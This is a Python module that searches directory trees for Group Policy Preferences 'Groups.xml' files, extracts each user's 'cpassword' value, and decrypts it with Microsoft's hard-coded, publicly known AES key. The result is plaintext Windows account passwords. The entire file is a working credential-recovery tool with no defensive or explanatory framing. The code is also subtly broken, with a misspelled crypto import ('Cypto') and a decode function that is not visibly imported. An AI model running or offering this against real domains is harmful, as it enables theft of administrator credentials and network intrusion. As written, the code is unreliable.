from pathlib import Path
import binascii

import lxml.etree
from Cypto.Cipher import AES

from . import logging
from .toolz import *

log = logging.new_log(__name__)

Element = lxml.etree.Element

@ensure_paths
def groups_xml_paths(path: Path):
    return pipe(
        path,
        walk,
        filter(lambda p: p.name == 'Groups.xml'),
        tuple,
    )

def user_name(user: Element):
    name = user.attrib.get('name')
    if '(built-in)' in name:
        name = name.split()[0]
    return name

@ensure_paths
def get_cpasswords(xml_path: Path):
    xpath = lxml.etree.parse(xml_path).xpath
    users = pipe(
        xpath('//User'),
    )
    log.info(users)
    def user_cpassword(user: Element):
        properties = user.find('Properties')
        if properties is not None:
            return (
                user_name(user),
                properties.attrib.get('cpassword')
            )
    return pipe(
        users,
        map(user_cpassword),
        filter(None),
        filter(second),
        sort_by(lambda t: lower(t[0])),
        tuple,
    )

MS_DEFAULT_AES_KEY = pipe(
    """
    4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
    f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
    """,
    replace(" ",""),
    replace("\n",""),
    binascii.unhexlify,
    to_bytes,    
)

def decrypt_cpassword(cpassword: str):
    binary_password = pipe(
        cpassword + ('=' * ((4 - len(cpassword) % 4) % 4)),
        b64decode,
    )

    decrypted = AES.new(
        MS_DEFAULT_AES_KEY,
        AES.MODE_CBC,
        b"\x00" * 16,
    ).decrypt(binary_password)

    return decrypted[:-decrypted[-1]].decode('utf16')
